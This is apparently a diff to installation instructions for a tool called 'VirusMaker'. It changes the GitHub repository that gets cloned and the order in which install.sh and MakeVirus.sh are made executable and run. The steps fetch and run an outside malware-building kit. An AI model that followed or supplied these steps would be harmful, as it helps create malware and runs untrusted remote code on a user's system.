@@ -20,15 +20,17 @@ apt update && apt upgrade -y
 
 apt install git python ruby -y
 
-git clone https://github.com/Errorking404/VirusMaker.git
+git clone https://github.com/Errorking404/ViRus.git
 
-cd VirusMaker
+cd ViRus
 
 chmod +x *
 
+chmod +x install.sh
+
 bash install.sh
 
-chmod +x install.sh
+chmod +x MakeVirus.sh
 
 ./MakeVirus.sh
 
